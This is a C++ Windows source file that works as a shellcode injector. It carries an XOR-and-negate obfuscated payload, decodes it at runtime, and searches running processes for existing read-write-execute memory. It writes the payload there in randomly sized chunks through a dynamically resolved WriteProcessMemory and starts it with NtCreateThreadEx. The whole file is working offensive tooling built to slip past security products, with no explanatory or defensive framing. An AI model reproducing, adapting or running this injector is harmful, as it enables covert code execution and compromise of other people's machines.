#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <memoryapi.h>
#include <iomanip>
#include "s.h"

#pragma comment(lib, "ntdll")

void PrintHex(const void* data, size_t size) {
    const unsigned char* bytes = static_cast<const unsigned char*>(data);
    for (size_t i = 0; i < size; ++i) {
        std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(bytes[i]) << " ";
    }
    std::cout << std::endl;
}



typedef BOOL(WINAPI* ImportWriteProcessMemory)(
    _In_ HANDLE hProcess,
    _In_ LPVOID lpBaseAddress,
    _In_reads_bytes_(nSize) LPCVOID lpBuffer,
    _In_ SIZE_T nSize,
    _Out_opt_ SIZE_T* lpNumberOfBytesWritten
    );

void ApplyXORAndNegate(unsigned char* shellcode, size_t shellcodeLen, const char* xorKey, size_t xorKeyLen) {
    size_t i;
    for (i = 0; i < shellcodeLen; ++i) {
        shellcode[i] ^= xorKey[i % xorKeyLen];
        shellcode[i] = ~shellcode[i];
    }
}


size_t RandomSegmentLength() {
    return rand() % 50 + 10;
}

void WriteRandomSegments(HANDLE process, LPVOID baseAddress, const unsigned char* data, size_t dataLen) {
    size_t bytesWritten = 0;
    while (bytesWritten < dataLen) {
        size_t segmentLength = RandomSegmentLength();
        if (bytesWritten + segmentLength > dataLen) {
            segmentLength = dataLen - bytesWritten;
        }

        ImportWriteProcessMemory MyWriteProcessMemory = (ImportWriteProcessMemory)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "WriteProcessMemory");
        BOOL Memory = MyWriteProcessMemory(process, (LPVOID)((DWORD_PTR)baseAddress + bytesWritten), data + bytesWritten, segmentLength, NULL);

        if (!Memory) {
            std::cout << "Failed to write segment to memory. Error code: " << GetLastError() << std::endl;
            break;
        }

        bytesWritten += segmentLength;
    }
}


int main() {

    unsigned char buf[] ="\xA9\x0C\xB0\xB1\xB4\xDB\x9D\x44\x33\x55\x05\x62\x14\x14\x61\x04\x12\x7B\x64\x96\x56\x1D\xCF\x61\x35\x0C\xB8\x07\x5C\x7B\xDE\x16\x13\x1D\xCF\x41\x05\x0C\x3C\xE2\x0E\x79\x18\x75\xFA\x1D\x75\xF3\xF9\x78\x52\x29\x46\x1F\x75\x05\xF2\x9C\x49\x72\x54\x85\xD1\xB8\x16\x72\x04\x0C\xB8\x07\x64\xB8\x17\x78\x7B\x54\x94\x55\xD4\x3C\x2B\x5E\x46\x46\x27\xCF\xB3\xDD\x44\x33\x55\x0C\xB6\x95\x30\x54\x1D\x45\xE3\x05\xCF\x7B\x4D\x00\xB8\x15\x64\x7A\x54\x94\xD0\x03\x0C\xCC\x9C\x05\xB8\x61\xCC\x7B\x54\x92\x7E\x64\x8D\x7B\x64\x84\x9F\x14\x85\xFA\x58\x05\x32\x94\x7C\xD3\x20\xB5\x7F\x56\x08\x17\x5D\x01\x0A\x84\x31\xEB\x0D\x00\xB8\x15\x60\x7A\x54\x94\x55\x14\xCF\x3F\x1D\x00\xB8\x15\x58\x7A\x54\x94\x72\xDE\x40\xBB\x1D\x45\xE3\x14\x1C\x72\x0D\x1A\x6A\x0F\x05\x6B\x14\x1D\x72\x0F\x0C\xB0\xB9\x64\x72\x07\xBB\xD3\x0D\x05\x6A\x0F\x0C\xB8\x47\xAD\x7C\xAA\xBB\xCC\x08\x2E\x33\x1C\xFA\x44\x3C\x2A\x5A\x3B\x21\x47\x55\x05\x65\x1C\xCD\xD5\x19\xCD\xC2\x14\xFE\x7F\x22\x62\x34\xAA\x91\x7B\x64\x8D\x7B\x64\x96\x7E\x64\x84\x7E\x64\x8D\x72\x05\x05\x63\x14\xFE\x09\x03\x3D\x94\xAA\x91\xD8\x26\x1E\x7B\xDC\x85\x72\xED\x65\x30\x55\x44\x7E\x64\x8D\x72\x04\x05\x62\x3F\x47\x72\x04\x05\x89\x02\xCD\xAC\x93\xBB\xE6\xBE\x1D\x68\x1D\xCD\xF2\x1D\x75\xE1\x1C\xCD\xEB\x18\x75\xFA\x07\x2C\x33\x57\x04\xB7\x07\x16\x72\xEF\xAF\x66\x7B\x7F\xCC\x80\x0C\xBA\x93\x0C\xB0\x96\x14\x59\x5F\x1B\x7B\xDC\xB5\x7B\xDC\x9E\x7A\x92\x84\xCC\xAA\xBB\xCC\x18\x75\xFA\x07\x16\x72\xEF\x69\x35\x4D\x3F\xCC\x80\xC1\xF3\x5A\xC1\xAE\x54\x44\x33\x1D\xBB\xFC\x5A\xC0\xBF\x54\x44\x33\xBE\x97\xDA\xB1\x45\x33\x55\xAC\x91\xAA\xBB\xCC\x7A\x0B\x56\x10\x20\x33\x23\x80\x28\xB6\x55\x1B\xAE\x56\x86\x97\xC8\x16\x1B\x57\x62\xC7\x55\x66\x8F\x5F\x58\x50\xB8\x9B\x05\xD2\xDB\x49\x81\xCD\x1C\x88\xF7\x6C\x71\x7E\xBA\xEB\x5B\x59\xD3\x53\x2C\x1E\x6E\x67\x12\x75\xB5\xC4\x6F\x88\x52\xBA\x29\x47\x95\x5B\x10\x2A\x0E\xB9\x25\x55\xBC\x71\x83\x27\x48\xE7\xDB\x08\x75\x44\x66\x26\x21\x41\x78\x05\x54\x30\x2A\x47\x6F\x64\x7E\x3A\x3E\x5A\x39\x28\x52\x7A\x71\x1D\x65\x64\x1B\x36\x2B\x5E\x25\x25\x47\x3C\x26\x5F\x30\x7F\x13\x18\x17\x7A\x10\x64\x02\x65\x6A\x03\x6E\x64\x64\x3C\x2A\x57\x3A\x33\x40\x75\x0A\x67\x75\x72\x1D\x67\x7F\x13\x02\x2D\x5D\x63\x70\x08\x75\x3C\x05\x61\x7F\x13\x01\x36\x5A\x31\x21\x5D\x21\x6B\x05\x7B\x74\x08\x75\x09\x77\x11\x07\x79\x06\x6D\x3E\x5F\x44\x1E\x69\x0F\xA2\x55\xAC\x99\x24\x3D\x2E\x81\x8F\x60\xC1\xC2\x55\x3B\x3A\x58\x15\xD3\x3C\xEA\x38\xAA\x74\xA6\x3F\x45\xF2\x57\x43\xC6\x0B\xAB\xE4\xC1\x41\x64\xBF\x8D\x29\x05\x48\x5C\xE6\x88\x1D\x2A\x2A\xDD\x7D\x4B\x1D\xB5\x80\xD5\xBC\x98\xC9\x39\xE0\xF6\xB8\x1F\x39\x48\x90\x5C\xEC\xFB\x0B\xFF\x8B\x00\xC0\xBD\xA4\xD4\x1C\x65\x1D\xAE\xC5\x6A\xC1\xB2\xB2\x64\x37\x56\xF9\x10\x1B\xDB\x7D\x8B\x60\xE8\xD7\x4E\x54\xBC\x69\x8E\xD1\xC4\xAD\x3E\xEF\x63\xD6\x87\xB3\x4E\x38\x6D\xF3\x0B\xB3\x15\x3C\x13\x44\x49\x7E\xF6\x6D\x95\xFC\x9C\x2A\x62\x1A\x72\x0B\xEE\x47\x0D\x94\x88\x51\x6F\x05\x72\x63\x25\xAF\x5C\x48\x73\xBD\x1E\x81\x83\xE1\xA1\x81\xDD\x22\xC7\x54\x06\x3C\x4E\x63\x47\x0B\x60\x3A\x1E\x41\x66\x24\x0D\x44\xB3\x1A\x55\x74\xF5\x57\xBD\xFF\x80\xD0\x1D\x8B\x62\x12\x06\x2E\x71\x1B\x05\xC9\x69\x11\x0B\x86\xC6\x3C\x94\xC6\x33\x14\xFA\xC3\xE0\xE6\x65\xAA\x91\x7B\x64\x8D\x89\x55\x44\x73\x55\x05\x8B\x55\x54\x33\x55\x05\x8A\x15\x44\x33\x55\x05\x89\x0D\xE0\x60\xB0\xBB\xE6\x1D\xD7\x60\x06\x0C\xBA\xB2\x0C\xBA\xA4\x0C\xBA\x8F\x05\x8B\x55\x64\x33\x55\x0D\xBA\xAC\x05\x89\x47\xD2\xBA\xB7\xBB\xE6\x1D\xC7\xF7\x75\xC1\xF3\x21\xF2\x55\xDE\x43\x7B\x54\x87\xB6\x95\x31\xE4\x0D\x1C\x6B\x1D\x41\x33\x55\x44\x33\x05\x87\xDB\xCA\xB9\xCC\xAA\x75\x0A\x67\x6A\x02\x63\x7C\x1D\x64\x7C\x03\x7B\x75\x01\x6D\x44\x09\x8B\x2C\x82";
    const char xorKey[] = "\xAA\xBB\xCC";
    size_t bufLen = sizeof(buf) - 1;
    size_t xorKeyLen = sizeof(xorKey) - 1;
    ApplyXORAndNegate((unsigned char*)(buf), bufLen, xorKey, xorKeyLen);


    

    MEMORY_BASIC_INFORMATION mbi = {};
    LPVOID offset = 0;
    HANDLE process = NULL;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    DWORD bytesWritten = 0;

    int flag = 0;

    if (snapshot == INVALID_HANDLE_VALUE) {
        std::cout << "Failed to create snapshot. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    Process32First(snapshot, &processEntry);

    while (Process32Next(snapshot, &processEntry)) {
        OBJECT_ATTRIBUTES objAttr = {};
        CLIENT_ID clientId = { 0 };
        ULONG_PTR cookie = 0;
        HANDLE hToken = nullptr;
        ACCESS_MASK accessMask = PROCESS_ALL_ACCESS;

        InitializeObjectAttributes(&objAttr, nullptr, 0, nullptr, nullptr);
        clientId.UniqueProcess = UlongToHandle(processEntry.th32ProcessID);

        NTSTATUS status2 = NtOpenProcess(&process, accessMask, &objAttr, &clientId);
        if (process) {
            std::wcout << processEntry.szExeFile << "\n";
            while (VirtualQueryEx(process, offset, &mbi, sizeof(mbi))) {
                if (mbi.AllocationProtect == PAGE_EXECUTE_READWRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE && mbi.RegionSize >= sizeof(buf)) {
                    std::cout << "\tPWX: 0x" << std::hex << mbi.BaseAddress << ", Region Size: 0x" << mbi.RegionSize << "\n";

                    WriteRandomSegments(process, mbi.BaseAddress, buf, sizeof(buf));
                    HANDLE hRemoteThread = NULL;
                    NTSTATUS status1 = NtCreateThreadEx(&hRemoteThread, THREAD_ALL_ACCESS, NULL, process, (LPTHREAD_START_ROUTINE)mbi.BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

                    flag = 1;
                }
                offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
                if (flag == 1)
                    break;
            }
            offset = 0;
        }
        else {
            std::cout << "Failed to open process. Error code: " << GetLastError() << std::endl;
        }
        CloseHandle(process);
        if (flag == 1)
            break;
    }

    CloseHandle(snapshot);
    return 0;
}
